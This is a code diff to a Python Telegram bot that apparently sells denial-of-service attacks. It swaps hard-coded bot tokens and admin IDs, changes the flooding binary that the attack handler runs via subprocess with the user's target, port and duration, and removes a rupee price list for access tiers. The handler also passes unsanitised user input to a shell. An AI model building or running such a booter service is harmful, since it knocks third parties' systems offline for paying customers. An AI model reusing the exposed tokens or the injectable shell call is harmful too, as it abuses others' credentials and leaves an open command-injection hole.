@@ -5,10 +5,10 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('8110594439:AAEWgEwg-hss2NRac_B-yyISgFKBmrIGE-E')
+bot = telebot.TeleBot('7708846625:AAG-0MmKDbkG91aUUc9r7VVYUxAgF1we49c')
 
 # Admin user IDs
-admin_id = {"7702886430"}
+admin_id = {"5142603617"}
 
 # File to store allowed user IDs
 USER_FILE = "users.txt"
@@ -301,7 +301,7 @@ def handle_attack(message):
                     start_attack_reply(message, target, port, time)
 
                     # Simulate attack process
-                    full_command = f"./2112 {target} {port} {time} 800"
+                    full_command = f"./known {target} {port} {time} 9 900"
                     subprocess.run(full_command, shell=True)
 
                     response = "Chudai completed successfully."
@@ -394,12 +394,6 @@ Vip  :
 > After Attack Limit :10 sec
 -> Concurrents Attack : 5
 
-Pr-ice List :
-Day-->150 Rs
-3Day-->300 Rs
-Week-->600 Rs
-Month-->1500 Rs
-'''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['admincmd'])
